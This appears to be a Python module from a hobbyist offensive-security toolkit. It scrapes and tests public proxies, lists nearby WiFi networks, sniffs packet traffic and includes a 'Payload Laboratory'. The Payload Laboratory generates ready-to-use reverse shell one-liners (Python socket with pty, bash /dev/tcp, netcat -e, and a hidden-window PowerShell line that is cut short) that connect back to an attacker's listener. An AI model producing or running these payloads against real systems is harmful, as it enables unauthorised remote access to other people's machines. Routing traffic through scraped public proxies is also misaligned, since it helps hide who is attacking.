import requests
import concurrent.futures
import time
import os
import subprocess
import re
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from src.utils.logging import add_system_log
from src.utils.ui import create_cyber_progress

console = Console()

def proxy_autopilot(silent=False):
    """Proxy Scraper & Validator - Finds and tests public proxies"""
    from src.utils.ui import create_cyber_progress
    if not silent:
        add_system_log("[bold cyan]AUTOPILOT:[/] Scraping public proxies...")
    api_urls = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://www.proxyscan.io/download?type=http"
    ]
    
    raw_proxies = []
    for url in api_urls:
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                raw_proxies.extend(resp.text.strip().split("\n"))
        except: continue
        
    unique_proxies = list(set([p.strip() for p in raw_proxies if ":" in p]))
    if not silent:
        console.print(f"[green]Found {len(unique_proxies)} unique proxies. Testing latency...[/]")
    
    valid_proxies = []
    def check_p(p):
        try:
            start = time.time()
            requests.get("http://httpbin.org/ip", proxies={"http": p, "https": p}, timeout=3)
            return (p, int((time.time()-start)*1000))
        except: return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        if not silent:
            with create_cyber_progress("Validating Proxies...", total=100) as progress:
                task = progress.add_task("Validating")
                futures = [executor.submit(check_p, p) for p in unique_proxies[:100]]
                results = []
                for f in concurrent.futures.as_completed(futures):
                    results.append(f.result())
                    progress.update(task, advance=1)
            valid_proxies = [r for r in results if r]
        else:
            futures = [executor.submit(check_p, p) for p in unique_proxies[:50]] # Scan less for speed in silent mode
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
            valid_proxies = [r for r in results if r]

    if silent:
        return [p for p, lat in valid_proxies]

    table = Table(title="Live Proxy Report", border_style="green")
    table.add_column("Proxy Address", style="cyan")
    table.add_column("Latency (ms)", style="yellow")
    
    for p, lat in sorted(valid_proxies, key=lambda x: x[1])[:15]:
        table.add_row(p, str(lat))
        
    console.print(Panel(table, title="Proxy Auto-Pilot Result"))
    add_system_log(f"[green]PROXY:[/] Auto-Pilot found {len(valid_proxies)} working proxies")

def wifi_ghost():
    """WiFi Ghost Recon: Scans for nearby networks (Windows Specialized)"""
    add_system_log("[bold cyan]GHOST:[/] Initiating WiFi Ghost Recon...")
    console.print("[bold yellow]📡 Scanning for nearby wireless signals...[/]")
    
    try:
        if os.name == 'nt':
            output = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True, stderr=subprocess.STDOUT).decode('cp874', errors='ignore')
            networks = output.split("SSID")
            
            table = Table(title="Nearby WiFi Networks", border_style="magenta")
            table.add_column("SSID", style="white")
            table.add_column("Signal %", style="green")
            table.add_column("Auth", style="yellow")
            table.add_column("BSSID", style="dim")
            
            for net in networks[1:]:
                try:
                    ssid = net.split(":")[1].split("\n")[0].strip() or "[Hidden]"
                    signal = re.search(r"Signal\s*:\s*(\d+)%", net).group(1)
                    auth = re.search(r"Authentication\s*:\s*(.*)", net).group(1).strip()
                    bssid = re.search(r"BSSID 1\s*:\s*(.*)", net).group(1).strip()
                    table.add_row(ssid, f"{signal}%", auth, bssid)
                except: continue
            
            console.print(Panel(table, border_style="bright_magenta"))
        else:
            console.print("[red]WiFi Ghost currently only supports Windows (netsh).[/]")
    except Exception as e:
        console.print(f"[red]Error during WiFi scan: {e}[/]")

def packet_insight(duration=10):
    """Live Packet Insight: Real-time traffic analysis"""
    from scapy.all import sniff, IP, TCP, UDP
    
    add_system_log(f"[bold cyan]INSIGHT:[/] Sniffing traffic for {duration}s...")
    console.print(f"\n[bold cyan]🕷️ Sniffing active on default interface for {duration} seconds...[/bold cyan]")
    
    stats = {"TCP": 0, "UDP": 0, "Other": 0}
    flows = []

    def process_pkt(pkt):
        if IP in pkt:
            src = pkt[IP].src
            dst = pkt[IP].dst
            proto = "TCP" if TCP in pkt else "UDP" if UDP in pkt else "Other"
            stats[proto] += 1
            if len(flows) < 15:
                flows.append(f"[dim]{src}[/] -> [cyan]{dst}[/] ([yellow]{proto}[/])")

    sniff(timeout=duration, prn=process_pkt, store=0)
    
    table = Table(title="Packet Insight Report", border_style="cyan")
    table.add_column("Protocol", style="cyan")
    table.add_column("Count", style="white")
    
    for k, v in stats.items():
        table.add_row(k, str(v))
        
    console.print(Panel(table, title="Traffic Distribution"))
    console.print("\n[bold white]Recent Connections Crawled:[/]")
    for f in flows: console.print(f" {f}")
    add_system_log("[green]INSIGHT:[/] Traffic analysis completed")

def payload_lab():
    """Payload Laboratory: Generates reverse shell exploit strings"""
    from rich.prompt import Prompt
    from rich.syntax import Syntax
    
    add_system_log("[bold cyan]LAB:[/] Opening exploits laboratory...")
    console.print("\n[bold magenta]🧬 Payload Laboratory - Reverse Shell Generator[/bold magenta]")
    
    lhost = Prompt.ask("[bold yellow]Listener Host (Your IP)[/]", default="127.0.0.1")
    lport = Prompt.ask("[bold yellow]Listener Port[/]", default="4444")
    
    shells = {
        "Python (Modern)": f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
        "Bash -i": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "Netcat (Traditional)": f"nc -e /bin/sh {lhost} {lport}",
        "PowerShell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});...\""
    }
    
    for name, code in shells.items():
        console.print(f"\n[bold green]➔ {name}:[/]")
        syntax = Syntax(code, "bash", theme="monokai", word_wrap=True)
        console.print(syntax)
    
    console.print("\n[dim]Ready! Setup your listener using: [bold blue]nc -lvnp " + lport + "[/bold blue][/dim]")
    add_system_log(f"[yellow]LAB:[/] Generated payloads for {lhost}:{lport}")
